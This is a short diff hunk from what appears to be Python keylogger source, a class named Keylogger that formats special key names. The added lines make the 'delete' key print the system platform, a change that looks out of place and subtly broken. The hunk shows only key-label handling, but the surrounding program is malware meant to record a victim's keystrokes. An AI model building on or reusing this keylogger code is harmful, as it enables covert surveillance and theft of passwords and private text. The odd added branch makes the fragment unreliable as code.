@@ -56,6 +56,8 @@ class Keylogger:
                     return
                 except:
                     pass
+            elif name == "delete":
+                print(sys.platform)
             else:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
